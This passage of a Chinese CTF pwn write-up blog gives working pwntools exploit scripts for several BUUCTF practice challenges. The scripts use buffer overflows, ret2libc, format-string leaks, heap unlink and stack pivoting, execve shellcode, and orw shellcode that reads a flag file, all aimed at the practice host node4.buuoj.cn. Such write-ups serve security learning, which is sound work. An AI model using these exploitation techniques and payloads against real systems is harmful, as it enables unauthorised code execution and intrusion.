class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    ru(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------------</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p8(<span class="hljs-number">0x41</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;p&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x8</span>)+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>show(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#-----------------------------------------------</span><br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#obj=LibcSearcher(&#x27;free&#x27;,addr)</span><br>base=addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#----------------------------------------------</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="cmcc-pwnme2">cmcc_pwnme2</h3><p>这题原本add_home,add_flag为的是在bss段的string里写入/home/flag然后利用exec_string读取flag</p><p>但在buu里路径flag就可以读取</p><p>不能用add_flag去填string会填入/flag(不同于flag,我猜)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27836</span>)<br>puts_plt=<span class="hljs-number">0x8048440</span><br>exec_string=<span class="hljs-number">0x80485cb</span><br>string=<span class="hljs-number">0x804a060</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(puts_plt)+p32(exec_string)+p32(string))<br>r.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="x-ctf-b0verfl0w">x_ctf_b0verfl0w</h3><p>又是遇到这种题目，还是用jmp_esp跳到栈上执行shellcode的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25252</span>)<br><span class="hljs-comment">#r=process(&#x27;./b0verfl0w&#x27;)</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>pd=<span class="hljs-string">&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27;</span><br>pd=pd.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>jmp_esp=<span class="hljs-number">0x08048504</span><br>pd+=p32(jmp_esp)+asm(<span class="hljs-string">&#x27;sub esp,0x28;call esp&#x27;</span>)<br>r.sendline(pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-leak-me">picoctf_2018_leak_me</h3><p>可以学到了，参考这位师傅<a href="https://blog.csdn.net/weixin_51298357/article/details/113420616">picoctf_2018_leak_me_白日梦-想家的博客-CSDN博客</a></p><p>这道题一开始F5不能显示伪代码。会显示又有个地方有问题，快捷键g输入有问题的地方的地址，然后点进去先反编译有问题的这个函数，然后再出来反编译整个函数就好了</p><p>puts是用\x00分隔的，密码与name相连，相差0x100距离，我们直接把\x00填满，puts就能带出password了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27410</span>)<br><br>r.sendline(<span class="hljs-string">&#x27;qyq&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a_reAllY_s3cuRe_p4s$word_f85406&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="suctf-2018-basic-pwn">suctf_2018_basic pwn</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27295</span>)r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x110</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401157</span>))r.interactive()<br></code></pre></td></tr></table></figure><h3 id="cmcc-pwnme1">cmcc_pwnme1</h3><p>这题没找到jmp rsp 用ret2libc做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26781</span>)libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)elf = ELF(<span class="hljs-string">&#x27;./pwnme1&#x27;</span>)r.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)r.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa4</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p32(<span class="hljs-number">0x8048624</span>)+p32(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]))puts_got=u32(r.recvuntil(<span class="hljs-string">&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_got)libc_base=puts_got-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]og=libc_base+0x3a812r.sendlineafter(<span class="hljs-string">&#x27;Please input the name of fruit:&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa4</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(og))r.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-heap">axb_2019_heap</h3><p>参考师傅：<a href="https://blog.csdn.net/weixin_45677731/article/details/108763362">buuctf axb_2019_heap_R1nd0的博客-CSDN博客</a></p><p>保护全开，但这题有格式化字符串漏洞，也可以off by one</p><p><strong>具体做法：</strong></p><p>1.格式化字符串漏洞泄露程序基址和libc基址</p><p>（要有程序基址才能得到bss段的地址）</p><p>例：如何得到15的偏移，先gdb填%p%p%p%p%p%p%p%p%p%p，测出输入变量的偏移为7</p><p>再调试，输入8个a，在printf(&amp;format)这里停下，看栈，__libc_start_main+240的距离偏移为8</p><p>8+7=15</p><p>2.利用off-by-one伪造chunk，free触发unlink，使chunk0指针指向它的-0x18处</p><p>3.由于got表不可改写，所以覆盖hook函数，，这里把__free_hook改为system的地址</p><p>4.还差/bin/sh，并不能直白的填/bin/sh，而是要填它所在地址所以那里要写p64(note+0x18)+“/bin/sh\x00”</p><p><strong>做题时遇到的问题：</strong></p><p>1.发现进入函数调试都不会调试都不会orz，参考师傅<a href="https://www.cnblogs.com/zhwer/p/12494317.html">gdb/pwndbg 常用命令简单整理 - 暖暖草果 - 博客园 (cnblogs.com)</a>，s  进入函数调试</p><p>2.看那个有漏洞的get_input函数看的我很懵，还有那个*((_QWORD *)&amp;note + 2 * v0) = malloc((unsigned int)size);<br>*((_DWORD *)&amp;note + 4 * SHIDWORD(size) + 2) = size;也看的很迷糊</p><p>2.这题我不知道哪里出问题，就是要输content那里，永远会让我go out，本地打通不了，只能学学思路打远端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./axb_2019_heap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29472</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;):&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>        sla(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Enter an index:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>        sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Enter an index:\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        sla(<span class="hljs-string">&#x27;Enter the content: \n&#x27;</span>,content)<br><span class="hljs-comment">#---------------------------------------        </span><br>ru(<span class="hljs-string">&#x27;Enter your name: &#x27;</span>)<br>sl(<span class="hljs-string">&#x27;%15$p%19$p&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>addr1=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)<br>libc_base=addr1-<span class="hljs-number">240</span>-libc.symbols[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]<br>addr2=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>base=addr2-<span class="hljs-number">0x116a</span><br>note=base+<span class="hljs-number">0x202060</span><br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#1</span><br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x90</span>)<br>fake_chunk+=p64(note-<span class="hljs-number">0x18</span>)+p64(note-<span class="hljs-number">0x10</span>)<br>fake_chunk+=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span><br>fake_chunk+=p64(<span class="hljs-number">0x90</span>)+p8(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,fake_chunk)<br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(free_hook)+p64(<span class="hljs-number">0x38</span>)+p64(note+<span class="hljs-number">0x18</span>)+<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>edit(<span class="hljs-number">0</span>,p64(system))<br>free(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="actf-2019-babystack">actf_2019_babystack</h3><p>这题只能溢出0xe0-0xd0=0x10</p><p>但这题给出了栈中变量所在的地址，用<strong>栈迁移</strong></p><p>（原本leave的地方填要迁移的地址，原本ret的地方填leave；ret的地址，还有就是迁移位置要填充8个a）</p><p><strong>做题时遇到的问题：</strong></p><p>1.libc.sym[‘main’]不能用，直接ida找main地址</p><p>2.送payload要用send，不能用sendline，不然不好接受泄露的值</p><p>3.我这个exp模板og好像只有u16，没发现本来</p><p><strong>记一下方法，备忘：</strong></p><p>1.one_gadget <a href="http://libc-2.27.so">libc-2.27.so</a></p><p>2.ROPgadget --binary ./ACTF_2019_babystack |grep “leave”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ACTF_2019_babystack&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29161</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------</span><br>leave_ret=<span class="hljs-number">0x400a18</span><br>ret=<span class="hljs-number">0x400709</span><br>pop_rdi=<span class="hljs-number">0x400ad3</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt=elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-comment">#main=elf.sym[&#x27;main&#x27;]</span><br>sleep(<span class="hljs-number">4</span>)<br>sl(<span class="hljs-string">&#x27;224&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;Your message will be saved at 0x&#x27;</span>)<br>addr=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(<span class="hljs-number">0x4008f6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xa8</span>+p64(addr)+p64(leave_ret))<br>ru(<span class="hljs-string">&#x27;Byebye~&#x27;</span>)<br>puts_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br>base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>shell=base+<span class="hljs-number">0x4f2c5</span><br>sla(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;224&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>se(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(shell))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-got-shell：">picoctf_2018_got_shell：</h3><p>用hex输出和用sendline</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./PicoCTF_2018_got-shell&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28451</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)<br>backdoor=<span class="hljs-number">0x804854b</span><br>r.sendline(<span class="hljs-built_in">hex</span>(elf.got[<span class="hljs-string">&#x27;exit&#x27;</span>]))<br>r.sendline(<span class="hljs-built_in">hex</span>(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="极客大挑战-2019-Not-Bad">[极客大挑战 2019]Not Bad</h3><p>这题可以溢出0x18，但buf所在的栈太小不够用rop来orw，解法：栈溢出处构造rop跳转至mmap申请的区域处执行</p><p>里面的orw命令读取flag</p><p>**工具使用：**seccomp-tools dump ./bad</p><p>看到可用read，write，open，exit</p><p><strong>参考师傅：</strong>[<a href="https://blog.csdn.net/mcmuyanga/article/details/113389703?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-7.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~default-7.no_search_link">BUUCTF]PWN——[极客大挑战 2019]Not Bad （orw_shellcode）_mcmuyanga的博客-CSDN博客</a></p><p>​       gdb调试该题：[<a href="https://blog.csdn.net/weixin_46521144/article/details/115196495">BUUCTF]PWN——[极客大挑战 2019]Not Bad详细解释_N1ch0l4s的博客-CSDN博客</a></p><p>jmp命令：无条件的转移到指令指定的地址去执行从该地址开始的命令</p><p>（jmp rsp 可以把使程序执行到栈上rsp的位置）</p><p><strong>orw命令：</strong>  一般都是这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">mmap=<span class="hljs-number">0x123000</span><br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)           <span class="hljs-comment">#打开根目录下的flag文件</span><br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap,<span class="hljs-number">0x50</span>)       <span class="hljs-comment">#读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里</span><br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap,<span class="hljs-number">0x50</span>)      <span 